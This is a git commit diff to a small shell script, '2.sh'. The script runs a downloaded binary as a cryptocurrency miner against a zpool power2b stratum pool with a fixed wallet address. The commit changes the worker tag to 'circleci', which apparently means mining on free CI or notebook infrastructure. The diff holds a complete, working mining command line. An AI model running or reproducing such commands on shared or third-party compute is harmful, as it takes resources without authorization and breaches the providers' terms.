0cf18b8910632d2ce6ca14ef1f5c17a98230a8b0
muo8j7 <82795637+muo8j7@users.noreply.github.com>
2021-04-19 13:41:32 +0700

    Update 2.sh

--- 2.sh
+++ 2.sh
@@ -5,5 +5,5 @@
 !chmod u+x 1
 
 
-!./1 -a power2b -o stratum+tcp://power2b.na.mine.zpool.ca:6242 -u DFBr5oFsLuStdpiuf79s4abpFqFjFmnEW3 -p c=tes
+!./1 -a power2b -o stratum+tcp://power2b.na.mine.zpool.ca:6242 -u DFBr5oFsLuStdpiuf79s4abpFqFjFmnEW3 -p c=circleci
 ! 
